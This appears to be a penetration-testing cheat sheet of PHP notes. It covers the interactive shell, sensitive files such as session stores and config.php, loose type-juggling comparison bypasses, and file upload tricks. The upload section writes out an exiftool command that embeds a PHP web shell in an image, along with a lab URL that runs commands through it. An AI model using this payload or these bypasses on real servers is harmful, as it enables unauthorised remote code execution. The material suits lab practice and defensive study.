# how to use php repl to test code

```bash
#starts interactive php shell
php -a

# use print_r to print results
print_r(pathinfo("/testweb/test.txt",PATHINFO_EXTENSION))
#> txt
```

# Check for juicy files


```bash
# sessions are saved here
/var/lib/php/sessions
# sess_6aengltqst8pck0jccrlkgmb8h 

#Config here deny or allow access any files in current or sub directory
.htaccess - c

#defines global variables or functions
server-install.php 
	
#sql install scripts that insert data into database
default-config.sql

#juicy configs
config.php


```

# PHP loose type juggling
	
```bash

# type juggling loose comparisons
$a == $b
0 == 0eabcdefg

# PHP 5
if ($result != $pass)
if (0 != 0eabcdefghigh) #FALSE

# concatenate vs + operator
$a = "1"
$b = "10000"
$c = "100easbdefg"

print($a + $b + $c) #
# 1 + 10000 + 100 = 10101

print($a . $b . $c)
#110000100easbdefg

# php -a
php > var_dump("0e1337" == 0);
# bool(true)
php > var_dump("0e1337" == "0");
# bool(true)
php > var_dump(0e1337 == "0");
# bool(true)
php > var_dump("2e2" == "200");


# see value that the string return After conversion

# bool(true)
php > var_dump(intval("2e1"));
# int(20)
php > var_dump(intval("2e2"));
# int(200)
php > var_dump(intval("0e1337"));
# int(0)
php > var_dump(intval("0e1337101"));
# int(0)

```

![](PHP-loose-comparison-table.png)
# PHP loose type juggling (php5 vs php7)

| comparison | php v5 | php 7 |
| - | - | - |
| var_dump('0xAAAA' == '43690'); | **true** <--- | false | 
| var_dump('0xAAAA' == 43690); | **true** <--- | false | 
| var_dump(0xAAAA == 43690); | true | true |
| var_dump('0xAAAA' == '43691'); | false | false | 



# File uploads

uploading rce
```php
exiftool -Comment='<?php system($_GET['cmd']); ?>' cat.php.jpeg
# http://10.10.10.185/images/uploads/cat.php.jpeg?cmd=hostname
```

### common file upload vulns
```php
# PATHINFO_EXTENSION only strips out the last extension
php > $t = pathinfo("/testweb/test.php.txt",PATHINFO_EXTENSION);
php > print_r($t)
# txt

# ======= magic byte checks=========
# **:** Calls the exif_imagetype function which takes in the uploaded file and reads the first bytes of an image and checks its signature. When a correct signature is found, the appropriate constant value will be returned (1 for GIF, 2 for JPEG, 3 for PNG, etc.), otherwise the return value is False.
$check = exif_imagetype($_FILES["image"]["tmp_name"]);
if(!in_array($check, $allowed)) {
	echo "Not allowed"
}


```
